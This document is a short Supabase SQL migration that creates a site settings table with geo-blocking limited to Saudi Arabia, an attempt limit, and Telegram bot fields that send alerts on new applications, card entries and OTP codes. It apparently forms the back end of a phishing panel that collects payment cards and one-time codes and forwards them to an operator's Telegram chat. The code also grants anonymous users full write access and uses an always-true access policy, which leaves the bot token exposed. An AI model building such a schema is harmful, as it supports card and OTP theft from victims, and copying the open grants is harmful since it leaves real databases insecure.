CREATE TABLE public.site_settings (
  id int PRIMARY KEY,
  geo_block_enabled boolean NOT NULL DEFAULT false,
  allowed_countries text[] NOT NULL DEFAULT ARRAY['SA'],
  attempt_block_enabled boolean NOT NULL DEFAULT false,
  max_attempts int NOT NULL DEFAULT 3,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.site_settings TO anon, authenticated;
GRANT ALL ON public.site_settings TO service_role;
ALTER TABLE public.site_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "site_settings_all" ON public.site_settings FOR ALL USING (true) WITH CHECK (true);
INSERT INTO public.site_settings (id) VALUES (1) ON CONFLICT DO NOTHING;
ALTER PUBLICATION supabase_realtime ADD TABLE public.site_settings;
ALTER TABLE public.site_settings
  ADD COLUMN IF NOT EXISTS telegram_enabled boolean NOT NULL DEFAULT false,
  ADD COLUMN IF NOT EXISTS telegram_bot_token text NOT NULL DEFAULT '',
  ADD COLUMN IF NOT EXISTS telegram_chat_id text NOT NULL DEFAULT '',
  ADD COLUMN IF NOT EXISTS telegram_notify_new_application boolean NOT NULL DEFAULT true,
  ADD COLUMN IF NOT EXISTS telegram_notify_card boolean NOT NULL DEFAULT true,
  ADD COLUMN IF NOT EXISTS telegram_notify_otp boolean NOT NULL DEFAULT true;